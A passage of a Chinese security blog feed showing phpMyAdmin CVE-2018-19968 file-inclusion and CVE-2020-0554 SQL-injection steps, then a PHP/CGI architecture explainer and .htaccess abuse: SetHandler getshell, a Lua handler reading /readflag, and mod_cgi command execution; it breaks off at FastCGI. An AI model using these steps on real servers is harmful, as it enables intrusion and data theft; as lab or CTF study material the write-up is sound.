为phpMyAdmin的COOKIE值</code></pre></div><h3 id="CVE-2018-19968：任意文件包含-RCE"><a href="#CVE-2018-19968：任意文件包含-RCE" class="headerlink" title="CVE-2018-19968：任意文件包含/RCE"></a>CVE-2018-19968：任意文件包含/RCE</h3><p>phpMyAdmin 4.8.0~4.8.3，利用如下：</p><p>创建数据库，并将 <code>PHP</code> 代码写入 <code>Session</code> 文件中:</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE foo;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> foo.bar (baz <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">PRIMARY</span> KEY );<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> foo.bar <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</code></pre></div><p>生成 <code>foo</code> 数据库的 <code>phpMyAdmin</code> 的配置表，访问：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.1.1.10</span>/chk_rel.php?fixall_pmadb=<span class="hljs-number">1</span>&amp;db=foo</code></pre></div><p>篡改数据插入 <code>pma column_info</code> 中：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span>` pma__column_infoSELECT <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>, <span class="hljs-string">&#x27;plop&#x27;</span>,<span class="hljs-string">&#x27;plop&#x27;</span>, <span class="hljs-string">&#x27; plop&#x27;</span>, <span class="hljs-string">&#x27;plop&#x27;</span>,<span class="hljs-string">&#x27;../../../../../../../../tmp/sess_***&#x27;</span>,<span class="hljs-string">&#x27;plop&#x27;</span>; # <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> 为phpMyAdmin 的COOKIE值</code></pre></div><p>这里要注意不用系统的 <code>session</code> 保存位置不同，具体系统可以在 <code>phpMyAdmin</code> 登录后首页看到</p><ul><li>MacOS<code>：</code>/var/tmp</li><li>Linux<code>：</code>/var/lib/php/sessions</li><li>phpStudy<code>：</code>/phpstudy/PHPTutorial/tmp/tmp</li></ul><p>访问包含 <code>Session</code> 文件的地址：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>tbl_replace.php?db<span class="hljs-operator">=</span>foo<span class="hljs-operator">&amp;</span><span class="hljs-keyword">table</span><span class="hljs-operator">=</span>bar<span class="hljs-operator">&amp;</span>where_clause<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>fields_name[multi_edit][][]<span class="hljs-operator">=</span>baz<span class="hljs-operator">&amp;</span>clause_is_unique<span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre></div><h3 id="CVE-2020-0554-后台SQL注入"><a href="#CVE-2020-0554-后台SQL注入" class="headerlink" title="CVE-2020-0554 后台SQL注入"></a>CVE-2020-0554 后台SQL注入</h3><p>报错注入</p><div class="hljs code-wrapper"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.209</span><span class="hljs-number">.139</span>:<span class="hljs-number">8001</span><span class="hljs-operator">/</span>server_privileges.php?ajax_request<span class="hljs-operator">=</span><span class="hljs-literal">true</span><span class="hljs-operator">&amp;</span>validate_username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></code></pre></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p><a href="https://xxxxx.com/sec/496.html#menu_index_3">phpmyadmin 后台 getshell 及漏洞利用</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#1-win-%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%9A">Mysql 在渗透测试中的利用</a></p></li><li><p><a href="https://blog.csdn.net/weixin_43940853/article/details/104527925">利用phpmyadmin getshell(非实战，在本地环境下进行)</a></p></li><li><p><a href="http://www.dengb.com/wzaq/1017388.html">获取MySQL中user.MYD中hash技巧</a></p></li><li><p><a href="https://github.com/vulhub/vulhub">vulhub</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/138266875">phpMyAdmin后台SQL注入(CVE-2020-0554)</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>phpmyadmin</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>phpmyadmin</tag>
      
      <tag>getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php .htaccess利用</title>
    <link href="/2020/10/30/php-htaccess%E5%88%A9%E7%94%A8/"/>
    <url>/2020/10/30/php-htaccess%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="php-htaccess利用"><a href="#php-htaccess利用" class="headerlink" title="php .htaccess利用"></a>php .htaccess利用</h1><h2 id="0x01-php-fpm、fastcgi、cgi之间的关系"><a href="#0x01-php-fpm、fastcgi、cgi之间的关系" class="headerlink" title="0x01 php-fpm、fastcgi、cgi之间的关系"></a>0x01 php-fpm、fastcgi、cgi之间的关系</h2><p>转载于：<a href="https://www.awaimai.com/371.html">https://www.awaimai.com/371.html</a></p><p>在整个网站架构中，Web Server（如Apache）只是内容的分发者。举个栗子，如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/html.png" alt="img"></p><p>如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/cgi.png" alt="img"></p><p>当Web Server收到 index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来<strong>PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。</strong>这就是一个完整的动态PHP Web访问流程，接下来再引出这些概念，就好理解多了，</p><ul><li><strong>CGI：</strong>是 Web Server 与 Web Application 之间数据交换的一种协议。</li><li><strong>FastCGI：</strong>同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。</li><li><strong>PHP-CGI：</strong>是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</li><li><strong>PHP-FPM：</strong>是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</li></ul><h2 id="0x02-Apache调用解析器的三种方式"><a href="#0x02-Apache调用解析器的三种方式" class="headerlink" title="0x02 Apache调用解析器的三种方式"></a>0x02 Apache调用解析器的三种方式</h2><p>参考：<a href="https://www.freebuf.com/vuls/218495.html">https://www.freebuf.com/vuls/218495.html</a></p><p>第一种是最通用最常见的<strong>Module方式</strong>，即在httpd.conf中使用LoadModule的方式，将php的dll或者so文件加载到apache当中。</p><p>还有两种是<strong>CGI方式</strong>和<strong>FastCGI方式</strong>。其实后者用的越来越广泛了。一般PHP-FPM也是与FastCGI进行配合使用的。</p><h4 id="Module方式"><a href="#Module方式" class="headerlink" title="Module方式"></a>Module方式</h4><p>以 Apache 为例，在PHP Module方式中，是不是在 Apache 的配置文件 httpd.conf 中加上这样几句：</p><div class="hljs code-wrapper"><pre><code class="hljs xml"># 加入以下2句LoadModule php5_module D:/php/php5apache2_2.dllAddType application/x-httpd-php .php# 修改如下内容<span class="hljs-tag">&lt;<span class="hljs-name">IfModule</span> <span class="hljs-attr">dir_module</span>&gt;</span>    DirectoryIndex index.php index.html<span class="hljs-tag">&lt;/<span class="hljs-name">IfModule</span>&gt;</span></code></pre></div><p>上面是 Windows 下安装php和apache环境后手动配置，在linux下源码安装大致是这样配置的：</p><div class="hljs code-wrapper"><pre><code class="hljs gradle"># .<span class="hljs-regexp">/configure --with-mysql=/u</span>sr<span class="hljs-regexp">/local --with-apache=/u</span>sr<span class="hljs-regexp">/local/</span>apache --enable-track-vars</code></pre></div><p>所以，这种方式，他们的共同本质都是用 LoadModule 来加载 php5_module，就是<strong>把php作为apache的一个子模块来运行</strong>。当通过web访问php文件时，apache就会调用php5_module来解析php代码。</p><p>php5_module是怎么来将数据传给php解析器来解析php代码的呢？答案是通过<strong>sapi</strong>。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1417244404_9526.png" alt="mode_php"></p><p>所以，以上的apache调用php执行的过程如下：</p><div class="hljs code-wrapper"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">apache</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">httpd</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">php5_module</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">sapi</span> -&gt;</span> php</code></pre></div><h4 id="CGI方式"><a href="#CGI方式" class="headerlink" title="CGI方式"></a>CGI方式</h4><p>CGI（<strong>Common Gateway Interface</strong>）全称是“<strong>通用网关接口</strong>”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。</p><p>WEB服务器会传哪些数据给PHP解析器呢？<strong>URL、查询字符串、POST数据、HTTP header</strong>都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。仔细想想，你在PHP代码中使用的用户从哪里来的。</p><p>也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。</p><p>CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给apache和php。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。</p><p>但是CGI有个蛋疼的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的<strong>fork-and-execute</strong>模式，这样一在大规模并发下，就死翘翘了。</p><h4 id="FastCGI方式"><a href="#FastCGI方式" class="headerlink" title="FastCGI方式"></a>FastCGI方式</h4><p>从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。</p><p>FastCGI像是一个<strong>常驻(long-live)型的CGI</strong>，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行，并且接受来自其它网站服务器来的请求。</p><p>FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。</p><h5 id="FastCGI的工作原理"><a href="#FastCGI的工作原理" class="headerlink" title="FastCGI的工作原理"></a>FastCGI的工作原理</h5><p>FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者<strong>多个脚本解析守护进程</strong>。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/fastcgi.png" alt="fastcgi"></p><ol><li>Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</li><li>FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</li><li>当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</li><li>FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web  Server。当FastCGI子进程关闭连接时，请求便告处理完成。<strong>FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</strong></li></ol><p>FastCGI与CGI特点：</p><ol><li><p><strong>对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。</strong>一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p></li><li><p>由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。</p></li></ol><h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>要了解PHP-FPM，就得先说说PHP-CGI。</p><p><strong>PHP-CGI就是PHP实现的自带的FastCGI管理器</strong>。 虽然是php官方出品，但是这丫的却一点也不给力，性能太差，而且也很麻烦不人性化，主要体现在：</p><ol><li>php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启。</li><li>直接杀死php-cgi进程，php就不能运行了。</li></ol><p>上面2个问题，一直让很多人病垢了很久，所以很多人一直还是在用 Module 方式。 直到 2004年一个叫 Andrei Nigmatulin的屌丝发明了PHP-FPM ，这神器的出现就彻底打破了这种局面，这是一个PHP专用的 fastcgi 管理器，它很爽的克服了上面2个问题，而且，还表现在其他方面更表现强劲。</p><p>也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。<strong>目前，PHP5.3版本之后，PHP-FPM是内置于PHP的</strong>。</p><p>因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p><p>PHP-FPM通过生成新的子进程可以实现php.ini修改后的平滑重启。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/update.png" alt="img"></p><p>所以，如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是<strong>Apache/Nginx</strong> + <strong>FastCGI</strong> + **PHP-FPM(+PHP-CGI)**方式了，不要再使用 Module加载或者 CGI 方式啦：）</p><h2 id="0x03-htaccess基本使用"><a href="#0x03-htaccess基本使用" class="headerlink" title="0x03 .htaccess基本使用"></a>0x03 .htaccess基本使用</h2><p>更加完整的文档：</p><ul><li><a href="https://perishablepress.com/stupid-htaccess-tricks/"><a href="https://perishablepress.com/stupid-htaccess-tricks/">Stupid .htaccess Tricks</a></a></li></ul><h3 id="htaccess文件使用前提"><a href="#htaccess文件使用前提" class="headerlink" title=".htaccess文件使用前提"></a>.htaccess文件使用前提</h3><p>.htaccess的主要作用就是实现url改写，也就是当浏览器通过url访问到服务器某个文件夹时，作为主人，我们可以来接待这个url，具体地怎样接待它，就是此文件的作用。所有的访问都是通过URL实现，所以.htaccess的作用非同小可。正因为此，所以一般地网站通过设置.htaccess，通过一个十分友好的url吸引用户进来，然后用.htaccess把用户带到需要访问的位置。</p><p>要想使用这个强大功能，就得开启apache里面的重写模块。</p><p>前面的文章中曾经讲到过<a href="http://www.nbphp.com/blog/windows-ubuntu-open-rewrite-mod-htaccess/">windows和ubuntu开启 rewrite模块使用.htaccess</a> 。</p><p>其实开启模块大体的步骤都是一样的，无论是Windows和linux。</p><h3 id="htaccess基本语法介绍"><a href="#htaccess基本语法介绍" class="headerlink" title=".htaccess基本语法介绍"></a>.htaccess基本语法介绍</h3><p>开启重写引擎 ：RewriteEngine on</p><p>设置重写的根目录：RewriteBase /   — 说明 ：因为定义了这个文件夹，所以对应的替换就有了一个参照。</p><p>匹配所有符合条件的请求：RewriteCond    — 说明：RewriteCond  定义了一系列规则条件，这个指令可以有一条或者多条，只有用户拿来的url符合这些条件之后，我们的.htaccess才开始接待，否则用户就直接自己去访问所需要的目录了。</p><p>举个例子，为了能让搜索引擎更多地抓取我们的网页而避免重复抓，我们通常把没有www的域名重定向到<a href="http://www.XXX.com，如下就实现了这个功能：">www.XXX.com，如下就实现了这个功能：</a></p><p>RewriteEngine On</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteCond</span></span> <span class="hljs-variable">%&#123;HTTP_HOST&#125;</span>  ^nbphp\.com$<span class="hljs-meta"> [NC]</span><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> ^(.*)$  http://www.nbphp.com/$<span class="hljs-number">1</span><span class="hljs-meta"> [R=301,L]</span></code></pre></div><p>上例便把nbphp.com 重定向到<a href="http://www.nbphp.com/">www.nbphp.com</a></p><p>%{HTTP_HOST} 是指取得用户访问的URL的主域名  然后空格后面是一个正则表达式匹配，意识就是说是否是 nbphp.com 。</p><p><strong>如果用户访问使用的URL满足所有列出的RewriteCond 提出的条件，那么进行下一步RewriteRule 即开始进行引导</strong>，这才开始实现.htaccess文件的重要功能。</p><p>同样，前面是正则表达式，<strong>用户分析用户的除了主域名nbphp.com之外的URL</strong> ,^(.*)$的意思就是所有的内容。 然后空格后面写的是我们引导用户访问的目录，我们带着他走到新的一个域名上。$1 指的是前面括号里匹配url所得到的内容。</p><p>这样就是一个完整的小例子。关于RewriteCond里 如何调用url的某个部分，我们可以参考这篇文章（<a href="http://blog.csdn.net/keyunq/archive/2008/06/11/2536875.aspx">Apache的Mod_rewrite学习 (RewriteCond重写规则的条件</a>)；</p><p>我们来分析一下 <a href="http://www.phplamp.org/2009/01/discuz7-htaccess-download/">discuz7.0 搜索引擎优化 htaccess </a>里面的重写。</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> ^forum-([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+)-([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+)\.html$  forumdisplay.php?fid=$<span class="hljs-number">1</span>&amp;page=$<span class="hljs-number">2</span></code></pre></div><p>首先加入用户通过 nbphp.com/forum-2-3.html  访问discuz论坛，那么先通过.htaccess过滤，看看是否需要.htaccess引导一下用户，如果满足列出的一系列RewriteCond的条件那么就进行重写，<strong>discuz的没有列出RewriteCond 所以应该全部都进行重写</strong>。所以开始进行转写，forum-2-3.html 这个正好符合  列出的^forum-([0-9]+)-([0-9]+).html$ 正则表达式。并且 $1 为 2  ，$2为3 ，所以代入后面，即  forumdisplay.php?fid=2&amp;page=3 加上前面的RewriteBase  指定的文件目录，那么就带他到制定目录的forumdisplay.php?fid=2&amp;page=3 。</p><h3 id="常见的-htaccess应用举例"><a href="#常见的-htaccess应用举例" class="headerlink" title="常见的.htaccess应用举例"></a>常见的.htaccess应用举例</h3><p><strong>防止盗链，如果来得要访问jpe jpg bmp png结尾的url 用户不是来自我们的网站，那么让他看一张我们网站的展示图片。</strong></p><p>RewriteEngine On</p><p>RewriteCond %{HTTP_REFERER} !^http://(.+.)?mysite.com/ [NC]</p><p>RewriteCond %{HTTP_REFERER} !^$</p><p>RewriteRule .*.(jpe?g|gif|bmp|png)$ /images/nohotlink.jpg [L]</p><p><strong>网站升级的时候，只有特定IP才能访问，其他的用户将看到一个升级页面</strong></p><p>RewriteEngine on</p><p>RewriteCond %{REQUEST_URI} !/upgrade.html$</p><p>RewriteCond %{REMOTE_HOST} !^24.121.202.30</p><p>RewriteRule $ <a href="http://www.nbphp.com/upgrade.html">http://www.nbphp.com/upgrade.html</a> [R=302,L]</p><p><strong>把老的域名转向新域名</strong></p><p># redirect from old domain to new domain</p><p>RewriteEngine On</p><p>RewriteRule ^(.*)$<a href="http://www.yourdomain.com/$1[R=301,L]">http://www.yourdomain.com/$1[R=301,L]</a></p><h3 id="一些其他功能"><a href="#一些其他功能" class="headerlink" title="一些其他功能"></a>一些其他功能</h3><p><strong>引出错误文档的目录</strong></p><p>ErrorDocument 400 /errors/badrequest.html</p><p>ErrorDocument 404  <a href="http://yoursite/errors/notfound.html">http://yoursite/errors/notfound.html</a></p><p>ErrorDocument 401 “Authorization Required</p><p><strong>Blocking users by IP 根据IP阻止用户访问</strong></p><p>order allow,deny</p><p>deny from 123.45.6.7</p><p>deny from 12.34.5. (整个C类地址)</p><p>allow from all</p><p><strong>防止目录浏览</strong></p><p># disable directory browsing</p><p>Options All -Indexes</p><p><strong>设置默认首页</strong></p><p># serve alternate default index page</p><p>DirectoryIndex about.html</p><p><strong>把一些老的链接转到新的链接上——搜索引擎优化SEO</strong></p><p>Redirect 301 /d/file.html<a href="http://www.htaccesselite.com/r/file.html">http://www.htaccesselite.com/r/file.html</a></p><p><strong>为服务器管理员设置电子邮件。</strong></p><p>ServerSignature EMail</p><p>SetEnv <a href="mailto:&#83;&#69;&#82;&#86;&#x45;&#x52;&#x5f;&#x41;&#x44;&#x4d;&#x49;&#78;&#100;&#x65;&#x66;&#x61;&#117;&#108;&#x74;&#x40;&#100;&#111;&#109;&#x61;&#105;&#110;&#x2e;&#99;&#x6f;&#109;">&#83;&#69;&#82;&#86;&#x45;&#x52;&#x5f;&#x41;&#x44;&#x4d;&#x49;&#78;&#100;&#x65;&#x66;&#x61;&#117;&#108;&#x74;&#x40;&#100;&#111;&#109;&#x61;&#105;&#110;&#x2e;&#99;&#x6f;&#109;</a></p><h2 id="0x04-htaccess生效方法"><a href="#0x04-htaccess生效方法" class="headerlink" title="0x04 .htaccess生效方法"></a>0x04 .htaccess生效方法</h2><p><code>vim /etc/apache2/apache2.conf</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200910163808808.png" alt="image-20200910163808808"></p><h2 id="0x05-htaccess利用方式"><a href="#0x05-htaccess利用方式" class="headerlink" title="0x05 .htaccess利用方式"></a>0x05 .htaccess利用方式</h2><h3 id="SetHandler-解析利用"><a href="#SetHandler-解析利用" class="headerlink" title="SetHandler 解析利用"></a>SetHandler 解析利用</h3><h4 id="1-解析成php——getshell"><a href="#1-解析成php——getshell" class="headerlink" title="1. 解析成php——getshell"></a>1. 解析成php——getshell</h4><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php</code></pre></div><p>此时当前目录及其子目录下所有文件都会被当做php解析</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01688d340f73299689.png" alt="img"></p><h4 id="2-解析成文本——查看源码"><a href="#2-解析成文本——查看源码" class="headerlink" title="2. 解析成文本——查看源码"></a>2. 解析成文本——查看源码</h4><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;\<span class="hljs-attr">.php</span>$&quot; &gt;</span>    SetHandler text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></code></pre></div><p>可以将当前目录下文件都当做文本解析，这样便可获得文件源码</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01384d631cb807c63d.png" alt="img"></p><p>或者用下面的方法：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> engine <span class="hljs-number">0</span></code></pre></div><h4 id="3-server-status——监控访问"><a href="#3-server-status——监控访问" class="headerlink" title="3. server-status——监控访问"></a>3. server-status——监控访问</h4><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01fbe1b91fd006c1d6.png" alt="img"></p><p>可添加参数<code>?refresh=5</code>来实现每隔5s自动刷新</p><p>可以监控所有的访问。但是信息不够多，还可以想想有没有附加的配置项。</p><h4 id="4-解析成lua脚本——绕过disable-functions"><a href="#4-解析成lua脚本——绕过disable-functions" class="headerlink" title="4. 解析成lua脚本——绕过disable_functions"></a>4. 解析成lua脚本——绕过disable_functions</h4><p>实际上是执行lua脚本。需要有apache-lua 模块，lua脚本能干的事情都能干，不运行php自然就不需要考虑disable_function的影响。</p><p>handler</p><div class="hljs code-wrapper"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">--[[</span><span class="hljs-comment">     This is the default method name for Lua handlers, see the optional</span><span class="hljs-comment">     function-name in the LuaMapHandler directive to choose a different</span><span class="hljs-comment">     entry point.</span><span class="hljs-comment">--]]</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span>    r:puts(<span class="hljs-string">&quot;Hello Lua World!\n&quot;</span>)    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)    r:puts(a)    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">else</span>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h3 id="CGI启动方式RCE利用"><a href="#CGI启动方式RCE利用" class="headerlink" title="CGI启动方式RCE利用"></a>CGI启动方式RCE利用</h3><p>当我们了解原理后，Apache是需要调用第三方CGI程序，但是一个程序是不是CGI程序这个事很难界定，我们能否通过调用特定的CGI程序(普通程序)来执行任意系统命令呢。答案是可以的。</p><h4 id="mod-cgi-模块"><a href="#mod-cgi-模块" class="headerlink" title="mod_cgi 模块"></a>mod_cgi 模块</h4><p>具有处理程序<code>cgi-script</code>的任何文件都将被视为  CGI 脚本，并由服务器运行，并将其输出返回给 Client 端。文件通过具有包含由<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_mime.html#addhandler">AddHandler</a>指令定义的 extensions 的名称或位于<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_alias.html#scriptalias">ScriptAlias</a>目录中来获取此处理程序。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>​    1.保证htaccess会被解析，即当前目录中配置了`AllowOverride all或AllowOverride Options FileInfo。AllowOverride参数具体作用可参考Apache之AllowOverride参数详解。(Require all granted也是需要的)</p><p>​    2.cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释。</p><p>​    3.有目录的上传、写入权限。</p></blockquote><h4 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h4><p>上传.htaccess  文件, 内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">Options ExecCGI<span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx</code></pre></div><p>Options ExecCGI表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。</p><p>Options +ExecCGI 作用相同。</p><p>第二句告诉Apache<strong>将xx后缀名的文件，当做CGI程序进行解析</strong>。</p><p>windows，上传poc.xx文件，内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /c start calc.exe</span></code></pre></div><p>linux，</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> Content-type: text/html<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>cat /flag</code></pre></div><p>这里需要注意脚本的格式，不知道为什么，这里去掉echo “”就无法执行成功，可能与cgi脚本的格式有关系。</p><p>linux环境下，也是随你玩，是直接调用**/bin/bash<strong>还是调用</strong>/usr/bin/python**来反弹Shell。都是可以的。这其实也就是正常使用方式，因为Python也会被用作为CGI解析程序。</p><h3 id="FastCGI启动方式RCE利用"><a href="#FastCGI启动方式RCE利用" class="headerlink" title="FastCGI启动方式RCE利用"></a>FastCGI启动方式RCE利用</h3><p>​    